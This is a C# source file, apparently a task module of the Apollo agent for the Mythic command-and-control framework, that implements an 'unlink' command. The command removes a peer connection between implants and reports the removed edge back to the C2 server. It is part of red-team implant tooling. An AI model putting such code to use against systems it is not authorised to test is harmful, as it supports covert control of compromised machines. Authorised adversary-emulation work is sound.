﻿#define COMMAND_NAME_UPPER

#if DEBUG
#define UNLINK
#endif

#if UNLINK

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.Serialization;
using ST = System.Threading.Tasks;


namespace Tasks
{
    public class unlink : Tasking
    {
        [DataContract]
        internal struct UnlinkParameters
        {
            [DataMember(Name = "link_info")]
            public LinkInformation ConnectionInfo;
        }

        public unlink(IAgent agent, Task data) : base(agent, data)
        {
        }

        public override void Kill()
        {
            base.Kill();
        }

        public override ST.Task CreateTasking()
        {
            return new ST.Task(() =>
            {
                TaskResponse resp;
                UnlinkParameters parameters = _jsonSerializer.Deserialize<UnlinkParameters>(_data.Parameters);
                CallbackInformation peerInfo;
                string sourceUUID;
                string destUUID;
                if (parameters.ConnectionInfo.Direction == EdgeDirection.BiDirectional || parameters.ConnectionInfo.Direction == EdgeDirection.SourceToDestination)
                {
                    peerInfo = parameters.ConnectionInfo.Destination;
                    sourceUUID = _agent.GetUUID();
                    destUUID = peerInfo.UUID;
                }
                else
                {
                    peerInfo = parameters.ConnectionInfo.Source;
                    sourceUUID = peerInfo.UUID;
                    destUUID = _agent.GetUUID();
                }
                if (_agent.GetPeerManager().Remove(peerInfo.UUID))
                {
                    resp = CreateTaskResponse($"Unlinked {peerInfo.Host}", true, "completed", new IMythicMessage[]
                    {
                        new EdgeNode()
                        {
                            Source =  sourceUUID,
                            Destination = destUUID,
                            Direction = parameters.ConnectionInfo.Direction,
                            Action = "remove",
                            C2Profile = parameters.ConnectionInfo.Profile.Name,
                            MetaData = ""
                        }, 
                    });
                }
                else
                {
                    resp = CreateTaskResponse($"Failed to unlink {peerInfo.Host}", true, "error");
                }
                // Your code here..
                // // CreateTaskResponse to create a new TaskResposne object
                // // Then add response to queue
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }
    }
}

#endif